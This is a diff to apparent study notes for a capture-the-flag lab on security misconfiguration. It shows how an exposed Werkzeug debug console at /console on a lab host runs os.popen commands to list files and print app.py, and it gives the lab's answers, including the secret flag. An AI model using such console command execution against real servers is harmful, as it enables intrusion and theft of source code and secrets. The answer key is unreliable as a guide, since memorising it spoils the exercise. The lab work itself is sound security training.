@@ -380,4 +380,37 @@ TASK 12: Security Misconfiguration
 - Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. 
 - Werkzeug includes a debug console that can be accessed either via URL on /console, or it will also be presented to the user if an exception is raised by the application.
 - In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.
-- 
+
+- Navigate to http://10.10.103.151:86 and try to exploit the security misconfiguration to read the application's source code.
+Navigate to http://10.10.103.151:86/console to access the Werkzeug console.
+Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
+			import os; print(os.popen("ls -l").read())
+
+a. What is the database file name (the one with the .db extension) in the current directory?
+sol. todo.db
+
+
+[console ready]
+>>> import os; print(os.popen("ls -l").read())
+total 24
+-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
+-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
+-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
+drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
+-rw-r--r--    1 root     root          8192 Nov 21 16:04 todo.db
+>>> import os; print(os.popen("cat app.py").read())
+import os
+from flask import Flask, render_template, request, redirect, url_for
+from flask_sqlalchemy import SQLAlchemy
+secret_flag = "THM{Just_a_tiny_misconfiguration}"
+PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
+DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')
+app = Flask(__name__)
+app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
+db = SQLAlchemy(app)
+...
+
+b. Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
+sol. THM{Just_a_tiny_misconfiguration}
+
+TASK 13: Vulnerable and Outdated Components
